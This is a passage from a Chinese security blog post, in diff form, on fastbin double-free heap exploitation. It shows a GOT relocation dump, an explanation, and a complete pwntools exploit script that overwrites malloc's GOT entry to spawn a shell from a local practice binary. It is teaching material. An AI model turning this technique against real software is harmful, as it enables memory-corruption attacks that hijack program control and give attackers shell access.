R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601078 R_X86_64_COPY     stdout@@GLIBC_2.2.5</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5</span><br><span class="line">0000000000601030 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</span><br><span class="line">0000000000601038 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5</span><br><span class="line">0000000000601040 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5</span><br><span class="line">0000000000601048 R_X86_64_JUMP_SLOT  malloc@GLIBC_2.2.5</span><br><span class="line">0000000000601050 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5</span><br><span class="line">0000000000601058 R_X86_64_JUMP_SLOT  __isoc99_scanf@GLIBC_2.7</span><br><span class="line">0000000000601060 R_X86_64_JUMP_SLOT  <span class="built_in">exit</span>@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p sh</span><br><span class="line"><span class="variable">$2</span> = &#123;void (char *)&#125; 0x4007d7 &lt;sh&gt;</span><br></pre></td></tr></table></figure>
+<p>所以我们只需要将0x601048的内容修改为0x4007d7就可以了，但是因为system()函数需要一个参数’sh’,所以我们从0x601040位置开始写入，将0x601040写入’sh‘,然后在最后再次调用malloc函数时，将sz参数换为’sh‘的地址就可以了，但是要注意的是输入的sz形式为%d，所以需要将0x601040换为十进制，即6295616<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./heap'</span>)</span><br><span class="line">elf =ELF(<span class="string">'./heap'</span>)</span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(x+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">molloc</span><span class="params">(i,s)</span>:</span></span><br><span class="line">    cmd(<span class="string">'1 %d\n25 %s'</span>%(i,s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(i)</span>:</span></span><br><span class="line">    cmd(<span class="string">'2 %d'</span>%i)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(i)</span>:</span></span><br><span class="line">    cmd(<span class="string">'3 %d'</span>%i)</span><br><span class="line"></span><br><span class="line">molloc(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">molloc(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">molloc(<span class="number">2</span>,p64(<span class="number">0x0601040</span>))</span><br><span class="line">molloc(<span class="number">3</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">molloc(<span class="number">4</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">x = p64(<span class="number">0x6873</span>) + p64(<span class="number">0x4007d7</span>) <span class="comment">#0x6873 = 'sh'</span></span><br><span class="line">molloc(<span class="number">5</span>,x)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1 6'</span>)</span><br><span class="line">p.sendline(<span class="string">'6295616 aaaaaaaa'</span>)  <span class="comment"># 0x601040 = 6295616</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/01/19/Fastbin_Double_Free/">Fastbin_Double_Free</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 钞sir 的个人博客">钞sir</a></p>
+        <p><span>发布时间:</span>2019年01月19日 - 17时22分</p>
+        <p><span>最后更新:</span>2019年01月19日 - 17时22分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/01/19/Fastbin_Double_Free/" title="Fastbin_Double_Free">https://cc-sir.github.io/2019/01/19/Fastbin_Double_Free/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://cc-sir.github.io/2019/01/19/Fastbin_Double_Free/　　作者: 钞sir" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2019/01/11/use_after_free/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Use After Free</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-number">3.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#首先先申请两块chunk：ptr-0-和ptr-1-，随便写入8字节的内容，然后分别free-ptr-0-free-ptr-1-free-ptr-0-，此时在ptr-0-和ptr-1-之间形成了一个双向链表，然后我们再申请一个chunk：ptr-2-，写入我们需要修改的地址，然后在申请两个chunk：ptr-3-和ptr-4-，随便写入8字节的内容，最后再次申请一个chunk：ptr-5-此时写入我们需要修改成的内容，就可以实现任意地址内容修改了"><span class="toc-number">4.</span> <span class="toc-text">首先先申请两块chunk：ptr[0]和ptr[1]，随便写入8字节的内容，然后分别free(ptr[0]),free(ptr[1]),free(ptr[0])，此时在ptr[0]和ptr[1]之间形成了一个双向链表，然后我们再申请一个chunk：ptr[2]，写入我们需要修改的地址，然后在申请两个chunk：ptr[3]和ptr[4]，随便写入8字节的内容，最后再次申请一个chunk：ptr[5],此时写入我们需要修改成的内容，就可以实现任意地址内容修改了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#演示"><span class="toc-number">5.</span> <span class="toc-text">演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">6.</span> <span class="toc-text">EXP</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/01/11/use_after_free/" title="下一篇: Use After Free">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/Fastbin_Double_Free/">Fastbin_Double_Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/use_after_free/">Use After Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/hello-world/">Hello World</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 钞sir
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
